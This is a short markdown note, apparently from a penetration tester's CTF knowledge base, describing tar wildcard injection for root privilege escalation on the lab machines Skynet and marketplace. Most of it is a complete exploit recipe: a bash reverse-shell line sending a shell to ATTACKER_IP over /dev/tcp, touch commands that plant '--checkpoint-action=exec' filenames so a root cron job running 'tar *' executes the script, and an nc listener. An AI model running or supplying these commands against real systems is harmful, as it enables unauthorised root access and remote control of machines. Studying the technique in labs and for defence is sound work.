# Tar Wildcard Injection

Privilege escalation through a privileged `tar` job that expands attacker-controlled filenames as command-line options.

Used on: **Skynet, marketplace**

## Why It Works

When a root cron job runs `tar *` in a writable directory, filenames beginning with `--checkpoint` and `--checkpoint-action` can become options to `tar`.

## Steps

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
nc -lvnp 4444
```

## Notes

- This is a real privesc primitive and belongs in `exploits/`, not enumeration.
- Preserve the exact cron path and payload from the writeup when available.

